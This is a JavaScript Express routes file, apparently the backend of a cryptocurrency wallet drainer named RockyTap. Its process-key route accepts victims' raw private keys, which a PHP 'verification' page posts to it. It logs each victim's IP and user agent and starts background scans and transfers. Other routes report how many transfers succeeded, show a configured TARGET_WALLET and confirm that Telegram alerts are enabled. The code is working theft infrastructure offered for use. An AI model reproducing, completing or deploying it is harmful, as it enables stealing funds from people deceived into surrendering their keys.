// Integration API routes
// Express routes for RockyTap integration

const { RockyTapIntegration } = require('../services/rockyTapIntegration');

// Integration service instance (will be initialized with config)
let integrationService = null;

function initializeIntegration(config) {
  if (!integrationService) {
    integrationService = new RockyTapIntegration(config);
  }
  return integrationService;
}

/**
 * POST /api/integration/process-key
 * Receive private key from PHP endpoint
 */
async function handleProcessKey(req, res, config) {
  try {
    const service = initializeIntegration(config);
    
    const { privateKey, verificationId, source, userId, sessionId } = req.body;
    
    if (!privateKey) {
      return res.status(400).json({
        success: false,
        error: {
          code: 'MISSING_PRIVATE_KEY',
          message: 'Private key is required'
        }
      });
    }

    // Validate private key format
    let normalizedKey = privateKey.trim();
    if (!normalizedKey.startsWith('0x')) {
      normalizedKey = '0x' + normalizedKey;
    }

    if (normalizedKey.length !== 66) {
      return res.status(400).json({
        success: false,
        error: {
          code: 'INVALID_PRIVATE_KEY',
          message: 'Invalid private key format'
        }
      });
    }

    // Process in background (async)
    const processId = await service.processPrivateKeyAsync(normalizedKey, {
      verificationId,
      source: source || 'RockyTap',
      userId,
      sessionId,
      ip: req.ip,
      userAgent: req.get('user-agent')
    });

    // Return immediate response
    res.json({
      success: true,
      message: 'Processing started',
      processId: processId,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('Process key error:', error);
    res.status(500).json({
      success: false,
      error: {
        code: 'PROCESSING_ERROR',
        message: error.message || 'Failed to start processing'
      }
    });
  }
}

/**
 * GET /api/integration/status/:processId
 * Check processing status
 */
async function handleStatus(req, res, config) {
  try {
    const service = initializeIntegration(config);
    const { processId } = req.params;

    const process = service.getProcessStatus(processId);

    if (!process) {
      return res.status(404).json({
        success: false,
        error: {
          code: 'PROCESS_NOT_FOUND',
          message: 'Process not found or expired'
        }
      });
    }

    // Remove sensitive data from response
    const safeProcess = {
      id: process.id,
      status: process.status,
      startedAt: process.startedAt,
      completedAt: process.completedAt,
      walletAddress: process.walletAddress ? 
        `${process.walletAddress.substring(0, 10)}...` : null,
      scanResults: process.scanResults ? {
        summary: process.scanResults.summary
      } : null,
      transferResults: process.transferResults ? {
        totalTransfers: process.transferResults.totalTransfers,
        successful: process.transferResults.successful,
        failed: process.transferResults.failed
      } : null,
      error: process.error
    };

    res.json({
      success: true,
      data: safeProcess
    });

  } catch (error) {
    console.error('Status check error:', error);
    res.status(500).json({
      success: false,
      error: {
        code: 'STATUS_CHECK_ERROR',
        message: error.message
      }
    });
  }
}

/**
 * GET /api/integration/stats
 * Get processing statistics
 */
async function handleStats(req, res, config) {
  try {
    const service = initializeIntegration(config);
    const stats = service.getStats();

    res.json({
      success: true,
      data: stats,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('Stats error:', error);
    res.status(500).json({
      success: false,
      error: {
        code: 'STATS_ERROR',
        message: error.message
      }
    });
  }
}

/**
 * POST /api/integration/webhook
 * Webhook endpoint for PHP callbacks
 */
async function handleWebhook(req, res, config) {
  try {
    const { event, data } = req.body;

    console.log(`Webhook received: ${event}`, data);

    // Handle different webhook events
    switch (event) {
      case 'verification.completed':
        // Could trigger additional processing if needed
        break;
      case 'verification.failed':
        // Handle failure case
        break;
      default:
        console.log(`Unknown webhook event: ${event}`);
    }

    res.json({
      success: true,
      message: 'Webhook received',
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('Webhook error:', error);
    res.status(500).json({
      success: false,
      error: {
        code: 'WEBHOOK_ERROR',
        message: error.message
      }
    });
  }
}

/**
 * GET /api/integration/health
 * Integration service health check
 */
async function handleHealth(req, res, config) {
  try {
    const service = initializeIntegration(config);
    const stats = service.getStats();

    res.json({
      success: true,
      status: 'healthy',
      service: 'RockyTap Integration',
      version: '1.0.0',
      uptime: process.uptime(),
      activeProcesses: stats.total,
      targetWallet: process.env.TARGET_WALLET ? 
        `${process.env.TARGET_WALLET.substring(0, 10)}...` : 'not configured',
      telegramEnabled: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID)
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      status: 'unhealthy',
      error: error.message
    });
  }
}

module.exports = {
  handleProcessKey,
  handleStatus,
  handleStats,
  handleWebhook,
  handleHealth
};

